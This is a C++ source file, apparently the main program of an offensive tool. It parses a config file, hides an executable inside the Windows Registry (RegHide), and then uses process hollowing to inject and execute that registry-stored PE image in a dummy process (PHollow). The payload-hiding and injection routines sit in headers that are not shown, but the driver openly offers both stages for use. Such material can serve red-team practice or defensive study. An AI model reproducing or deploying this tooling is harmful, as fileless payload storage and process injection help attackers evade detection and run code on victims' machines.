#include <iostream>
#include <fstream>

#include "PHollow.h"
#include "RegHide.h"

#define CONFIG_FILE_PATH "./config.ini"

using namespace std;

// CONFIG VALUES FOR REGHIDE
std::string strConfigPathToSourceFile;

// CONFIG VALUES FOR PROCESS HOLLWING
std::string strConfigPathToDummyProcessFile;

// UNIVERSAL CONFIG VALUES
std::string strConfigRegKeyName;
std::string strConfigValuePrefix;
std::string hConfigGlobalHkey;


int main()
{
	std::ifstream in(CONFIG_FILE_PATH);
	if (!in.is_open())
	{
		printf("Cannot open configuration file from %s", CONFIG_FILE_PATH);
		return false;
	}

	std::string config_param;
	std::string config_value;

	while (!in.eof())
	{
		in >> config_param;
		in >> config_value;

		if (config_param == "SOURCE_FILE_PATH")
		{
			strConfigPathToSourceFile = config_value;
		}
		else if (config_param == "DUMMY_PROCESS_FILE_PATH")
		{
			strConfigPathToDummyProcessFile = config_value;
		}
		else if (config_param == "GLOBAL_HKEY")
		{
			hConfigGlobalHkey = config_value;
		}
		else if (config_param == "REGISTRY_KEY_NAME")
		{
			strConfigRegKeyName = config_value;
		}
		else if (config_param == "REGISTRY_VALUE_PREFIX")
		{
			strConfigValuePrefix = config_value;

		}
	}
	in.close();
	char UserInput;
	const char* strPathToSourceFile = strConfigPathToSourceFile.c_str();
	LPCSTR strPathToDummyProcess = strConfigPathToDummyProcessFile.c_str();
	const char* strRegKeyName = strConfigRegKeyName.c_str();
	std::string strValuePrefix = strConfigValuePrefix.c_str();
	HKEY hGlobalHkey = NULL;

	if (hConfigGlobalHkey == "HKEY_CLASSES_ROOT")
	{
		hGlobalHkey = HKEY_CLASSES_ROOT;
	}
	else if (hConfigGlobalHkey == "HKEY_CURRENT_USER")
	{
		hGlobalHkey = HKEY_CURRENT_USER;
	}
	else if (hConfigGlobalHkey == "HKEY_LOCAL_MACHINE")
	{
		hGlobalHkey = HKEY_LOCAL_MACHINE;
	}
	else if (hConfigGlobalHkey == "HKEY_USERS")
	{
		hGlobalHkey = HKEY_USERS;
	}
	else if (hConfigGlobalHkey == "HKEY_CURRENT_CONFIG")
	{
		hGlobalHkey = HKEY_CURRENT_CONFIG;
	}
	else
	{
		cout << "Check GLOBAL_HKEY value in config.ini, only support HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS or HKEY_CURRENT_CONFIG";
		exit(-1);
	}

	cout << "Enter 'w' to run RegHide(Hide an executable in Windows Registry)\nEnter 'e' to run PHollow(Process Hollow & execute PE image in Windows Registry\nInput: ";
	cin >> UserInput;
	switch (UserInput)
	{
		case 'w':
			printf("\nHiding %s into windows registry\n", strConfigPathToSourceFile.c_str());
			printf("\nUsing the following arguments\nGlobal HKEY: %s\nRegistry Key: %s\nRegistry Value Prefix: %s\n\n\n", \
				hConfigGlobalHkey.c_str(), strConfigRegKeyName.c_str(), strConfigValuePrefix.c_str());

			RegHide(strPathToSourceFile, hGlobalHkey, strRegKeyName, strValuePrefix);
			cout << "Successfully written the source file to Windows Registry.\nCheck regedit!\nDon't forget to delete the key when you are done!\n" ;
			break;

		case 'e':
			printf("\nInjecting payload into %s\n", strConfigPathToDummyProcessFile.c_str());
			printf("\nUsing the following arguments\nGlobal HKEY: %s\nRegistry Key: %s\nRegistry Value Prefix: %s\n\n\n", \
				hConfigGlobalHkey.c_str(), strConfigRegKeyName.c_str(), strConfigValuePrefix.c_str());

			PHollow(strPathToDummyProcess, hGlobalHkey, strRegKeyName, strValuePrefix);
			printf("\nSuccessfully executed the payload, check your taskbar!\n");
			break;

		default:
			fprintf(stderr, "Unrecognized option. Must be w or e.\n");
			exit(-1);
	}

	system("pause");
	exit(-1);

}
